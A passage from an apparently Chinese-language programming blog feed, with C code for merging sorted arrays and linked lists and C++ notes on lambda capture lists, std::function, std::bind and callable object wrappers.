class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType *elem;<br>    <span class="hljs-type">int</span> length;<br>&#125; node, *linkList;<br><br>status <span class="hljs-title function_">printfList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; headNode-&gt;length; ++i) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d &quot;</span>, headNode-&gt;elem[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList *headNode)</span> &#123;<br><br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;num);<br>    (*headNode) = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    (*headNode)-&gt;length = num;<br>    (*headNode)-&gt;elem = (ElemType *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(ElemType) * num);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;(*headNode)-&gt;elem[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">combineList</span><span class="hljs-params">(linkList *headNode1, linkList headNode2)</span> &#123;<br>    <span class="hljs-type">int</span> subLa = <span class="hljs-number">0</span>, subLb = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> l1 = (*headNode1)-&gt;length, l2 = headNode2-&gt;length;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    ElemType *temC = (<span class="hljs-type">int</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>) * (l1 + l2));<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; subLa &lt; l1 &amp;&amp; subLb &lt; l2; ++i) &#123;<br>        temC[i] = (*headNode1)-&gt;elem[subLa] &lt; headNode2-&gt;elem[subLb] ? (*headNode1)-&gt;elem[subLa++]<br>                                                                     : headNode2-&gt;elem[subLb++];<br>    &#125;<br>    <span class="hljs-keyword">while</span> (i &lt; l1 + l2) &#123;<br>        *(temC + i) = subLb &lt; l2 ? (headNode2)-&gt;elem[subLb++] : (*headNode1)-&gt;elem[subLa++];<br>        i++;<br>    &#125;<br>    (*headNode1)-&gt;elem = temC;<br>    (*headNode1)-&gt;length = l1 + l2;<br><br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br>status <span class="hljs-title function_">destroyLink</span><span class="hljs-params">(linkList pDel)</span> &#123;<br>    <span class="hljs-keyword">if</span> (pDel == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(pDel-&gt;elem);<br>    <span class="hljs-built_in">free</span>(pDel);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList headNode1 = <span class="hljs-literal">NULL</span>;<br>    linkList headNode2 = <span class="hljs-literal">NULL</span>;<br>    initList(&amp;headNode1);<br>    initList(&amp;headNode2);<br>    combineList(&amp;headNode1, headNode2);<br>    printfList(headNode1);<br>    destroyLink(headNode1);<br>    destroyLink(headNode2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType elem;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; node, *linkList;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList *headNode)</span> &#123;<br><br>    (*headNode) = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    (*headNode)-&gt;elem = <span class="hljs-number">0</span>;<br>    (*headNode)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;num);<br>    node *moveNode = (*headNode);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        temNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;temNode-&gt;elem);<br>        moveNode-&gt;next = temNode;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>&#125;<br><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode;<br>    node *deleteNode = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>        num++;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,num);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">combineList</span><span class="hljs-params">(linkList *headNode, linkList headNode2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span> || headNode2 == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode1 = (*headNode)-&gt;next, *moveNode2 = headNode2-&gt;next, *moveNodeC = (*headNode);<br>    <span class="hljs-keyword">while</span> (moveNode1 != <span class="hljs-literal">NULL</span> &amp;&amp; moveNode2 != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (moveNode1-&gt;elem &gt; moveNode2-&gt;elem) &#123;<br>            moveNodeC-&gt;next = moveNode2;<br>            moveNode2 = moveNode2-&gt;next;<br>            moveNodeC=moveNodeC-&gt;next;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            moveNodeC-&gt;next = moveNode1;<br>            moveNode1 = moveNode1-&gt;next;<br>            moveNodeC=moveNodeC-&gt;next;<br>        &#125;<br>    &#125;<br>    moveNodeC-&gt;next = moveNode1==<span class="hljs-literal">NULL</span> ? moveNode2 : moveNode1;<br>    <span class="hljs-built_in">free</span>(headNode2);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d &quot;</span>, moveNode-&gt;elem);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList headNode1=<span class="hljs-literal">NULL</span>;<br>    linkList headNode2=<span class="hljs-literal">NULL</span>;<br>    initList(&amp;headNode1);<br>    initList(&amp;headNode2);<br>    printfNode(headNode1);<br>    combineList(&amp;headNode1,headNode2);<br>    printfNode(headNode1);<br>    destroyList(headNode1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lambda高级使用</title>
    <link href="/2023/03/26/c++/lambda%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/03/26/c++/lambda%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="lambda高级使用"><a href="#lambda高级使用" class="headerlink" title="lambda高级使用"></a>lambda高级使用</h1><h2 id="捕获列表"><a href="#捕获列表" class="headerlink" title="捕获列表"></a>捕获列表</h2><p>lambda 表达式还可以通过捕获列表捕获一定范围内的变量：</p><ul><li>[] 不捕获任何变量。</li><li>[&amp;] 捕获外部作用域中所有变量，并作为引用在函数体中使用（按引用捕获）。</li><li>[&#x3D;] 捕获外部作用域中所有变量，并作为副本在函数体中使用（按值捕获）。</li><li>[&#x3D;，&amp;foo] 按值捕获外部作用域中所有变量，并按引用捕获 foo 变量。</li><li>[bar] 按值捕获 bar 变量，同时不捕获其他变量。</li><li>[this] 捕获当前类中的 this <a href="http://c.biancheng.net/c/80/">指针</a>，让 lambda 表达式拥有和当前类成员函数同样的访问权限。如果已经使用了 &amp; 或者 &#x3D;，就默认添加此选项。捕获 this 的目的是可以在 lamda 中使用当前类的成员函数和成员变量。</li></ul><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><h3 id="捕获"><a href="#捕获" class="headerlink" title="捕获"></a>捕获</h3><ol><li>没有捕获的时候，我们将该lambda变量可以看成函数指针</li><li>有捕获的时候，我们将该lambda表达式堪称仿函数</li></ol><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><ol><li><p>使用<code>function</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;functional&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;vector&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> a&#123;<span class="hljs-number">9</span>&#125;;<br>    <span class="hljs-type">int</span> b&#123;<span class="hljs-number">10</span>&#125;;<br>    [a,b](<span class="hljs-type">int</span> x)-&gt;<span class="hljs-type">void</span>&#123;<br>        std::cout&lt;&lt;a+b&lt;&lt;std::endl&lt;&lt;x&lt;&lt;std::endl;<br>    &#125;(<span class="hljs-number">88</span>);<br>    std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">int</span>,std::string)&gt; func&#123;[](<span class="hljs-type">int</span> num,std::string S)-&gt;<span class="hljs-type">void</span>&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;num= &quot;</span>&lt;&lt;num&lt;&lt;<span class="hljs-string">&quot; name= &quot;</span>&lt;&lt;S&lt;&lt;std::endl;<br>    &#125;&#125;;<br>    <span class="hljs-built_in">func</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;chg&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>使用<code>bind</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> a&#123;<span class="hljs-number">9</span>&#125;;<br>    <span class="hljs-type">int</span> b&#123;<span class="hljs-number">10</span>&#125;;<br>    [a,b](<span class="hljs-type">int</span> x)-&gt;<span class="hljs-type">void</span>&#123;<br>        std::cout&lt;&lt;a+b&lt;&lt;std::endl&lt;&lt;x&lt;&lt;std::endl;<br>    &#125;(<span class="hljs-number">88</span>);<br>    <span class="hljs-keyword">auto</span> f2= std::<span class="hljs-built_in">bind</span>([](<span class="hljs-type">int</span> num,std::string S)-&gt;<span class="hljs-type">void</span>&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;num= &quot;</span>&lt;&lt;num&lt;&lt;<span class="hljs-string">&quot; name= &quot;</span>&lt;&lt;S&lt;&lt;std::endl;<br>    &#125;,std::placeholders::_1,std::placeholders::_2);<br>    <span class="hljs-built_in">f2</span>(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;zjy&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>可调用对象包装器</title>
    <link href="/2023/03/26/c++/%E5%8F%AF%E8%B0%83%E7%94%A8%E5%AF%B9%E8%B1%A1%E5%8C%85%E8%A3%85%E5%99%A8/"/>
    <url>/2023/03/26/c++/%E5%8F%AF%E8%B0%83%E7%94%A8%E5%AF%B9%E8%B1%A1%E5%8C%85%E8%A3%85%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="可调用对象包装器"><a href="#可调用对象包装器" class="headerlink" title="可调用对象包装器"></a>可调用对象包装器</h1><h2 id="可调用对象"><a href="#可调用对象" class="headerlink" title="可调用对象"></a>可调用对象</h2><p>可以按照函数的方法进行调用</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul><li><p>函数指针</p><blockquote><p>使用<code>using</code>进行定义函数指针</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> callBack = <span class="hljs-built_in">void</span>(*)(<span class="hljs-type">int</span>, <span class="hljs-type">double</span>);<br></code></pre></td></tr></table></figure></li><li><p>仿函数</p></li><li><p>可以转换为函数的类对象</p></li><li><p>类成员的函数指针</p></li><li><p>实例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*这段代码定义了一个名为name1的类，其中包含两个函数testFunc和testFunc2。testFunc是静态函数，可以通过指针调用，而testFunc2是实例方法，只能通过对象调用。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">此外，代码还定义了一个名为callBack的函数指针类型，它接受一个int类型和一个double类型的参数，并且没有返回值。在类定义中，将operator callBack()定义为转换运算符，它返回testFunc的指针，使得对象也可以像函数一样被调用。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">在main函数中，首先使用obj.operator callBack()将obj对象转换为callBack类型的函数指针，并将其赋值给func。然后，使用&amp;name1::testFunc将testFunc的地址赋值给func2，使用&amp;name1::testFunc2将testFunc2的地址赋值给func3。最后，使用func(1,2)调用testFunc函数。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">整体来说，此代码演示了如何定义和使用函数指针以及转换运算符的概念。*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span>  std;<br><span class="hljs-keyword">using</span> callBack=<span class="hljs-built_in">void</span>(*)(<span class="hljs-type">int</span> ,<span class="hljs-type">double</span>);<br> <span class="hljs-keyword">class</span> <span class="hljs-title class_">name1</span> &#123;<br><span class="hljs-keyword">public</span>:<br>     <span class="hljs-comment">//callBack是定义的函数指针变量名,这一步是想将类名当作函数使用</span><br>     <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">callBack</span> <span class="hljs-params">()</span></span>&#123;<br>         <span class="hljs-keyword">return</span> testFunc;<br>     &#125;<br>     <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">testFunc</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">double</span> b)</span></span>&#123;<br>         cout&lt;&lt;a+b&lt;&lt;endl;<br>     &#125;<br>     <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">testFunc2</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">double</span> b)</span></span>&#123;<br>         cout&lt;&lt;a+b&lt;&lt;endl;<br>     &#125;<br>&#125;;<br><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">using</span> callBack2=<span class="hljs-built_in">void</span>(name1::*)(<span class="hljs-type">int</span> ,<span class="hljs-type">double</span>);<br>    name1 obj;<br>    <span class="hljs-comment">//通过转换运算符</span><br>    callBack func=obj.<span class="hljs-keyword">operator</span> <span class="hljs-built_in">callBack</span>();<br>    <span class="hljs-comment">//通过函数指针</span><br>    callBack func2=&amp;name1::testFunc;<br>    <span class="hljs-comment">//callBack2是限定了作用域的函数指针，注意此处必须要有&amp;</span><br>    callBack2 func3=&amp;name1::testFunc2;<br><br>    <span class="hljs-built_in">func</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ul><h2 id="function的使用"><a href="#function的使用" class="headerlink" title="function的使用"></a><code>function</code>的使用</h2><ul><li><p>作用：说是可调用对象当作函数使用</p></li><li><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br>  <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;functional&quot;</span></span><br>  <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;string&quot;</span></span><br>  <span class="hljs-keyword">using</span> callBack = <span class="hljs-built_in">void</span>(*)(<span class="hljs-type">int</span> a,std::string s);<br>  <br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>      std::cout&lt;&lt;<span class="hljs-string">&quot;this is func&quot;</span>&lt;&lt;std::endl;<br>      std::cout&lt;&lt;<span class="hljs-string">&quot;a = &quot;</span>&lt;&lt;a&lt;&lt;<span class="hljs-string">&quot; string: &quot;</span>&lt;&lt;s&lt;&lt;std::endl;<br>  &#125;<br>  <br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">testStruct</span>&#123;<br>      <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>          std::cout&lt;&lt;<span class="hljs-string">&quot;this is testStruct&quot;</span>&lt;&lt;std::endl;<br>          std::cout&lt;&lt;<span class="hljs-string">&quot;a = &quot;</span>&lt;&lt;a&lt;&lt;<span class="hljs-string">&quot; string: &quot;</span>&lt;&lt;s&lt;&lt;std::endl;<br>      &#125;<br>  &#125;;<br>  <br>  <span class="hljs-keyword">class</span> <span class="hljs-title class_">name1</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>      <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">classFunc</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>          std::cout&lt;&lt;<span class="hljs-string">&quot;this is classFunc&quot;</span>&lt;&lt;std::endl;<br>          std::cout&lt;&lt;<span class="hljs-string">&quot;a = &quot;</span>&lt;&lt;a&lt;&lt;<span class="hljs-string">&quot; string: &quot;</span>&lt;&lt;s&lt;&lt;std::endl;<br>      &#125;<br>      <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">callBack</span> <span class="hljs-params">()</span></span>&#123;<br>          <span class="hljs-keyword">return</span> classFunc;<br>      &#125;<br>  <br>      <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>          std::cout&lt;&lt;<span class="hljs-string">&quot;this is classOperator()&quot;</span>&lt;&lt;std::endl;<br>          std::cout&lt;&lt;<span class="hljs-string">&quot;a = &quot;</span>&lt;&lt;a&lt;&lt;<span class="hljs-string">&quot; string: &quot;</span>&lt;&lt;s&lt;&lt;std::endl;<br>      &#125;<br>  &#125;;<br>  <br>  <span class="hljs-keyword">class</span>  <span class="hljs-title class_">print</span>&#123;<br>  <span class="hljs-keyword">public</span>:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-type">const</span> std::function&lt;<span class="hljs-built_in">void</span>(<span class="hljs-type">int</span>,std::string)&gt;&amp; function1):<span class="hljs-built_in">tem</span>(function1)&#123;&#125;;<br>      <span class="hljs-comment">//调用function</span><br>       <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Printf</span><span class="hljs-params">(<span class="hljs-type">int</span> a,std::string s)</span></span>&#123;<br>          <span class="hljs-built_in">tem</span>(a,s);<br>      &#125;<br>  <span 